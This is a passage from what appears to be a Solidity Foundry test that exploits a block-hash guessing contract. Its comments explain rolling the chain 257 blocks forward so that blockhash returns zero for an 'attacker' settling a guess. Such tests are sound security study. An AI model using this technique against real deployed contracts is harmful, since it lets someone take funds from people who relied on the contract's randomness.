        uint256 guessedBlock = blockNumber + 1;
        
        // We need to wait for more than 256 blocks after the guessed block
        // so that blockhash(guessedBlock) returns 0
        // We need block.number > guessedBlock (to call settle)
        // AND guessedBlock to be more than 256 blocks in the past
        
        // Roll forward 257 blocks from the guessed block
        vm.roll(guessedBlock + 257);
        
        // At this point:
        // - block.number > guesses[attacker].block (guessedBlock) ✓
        // - blockhash(guessedBlock) will return 0 because it's > 256 blocks old ✓
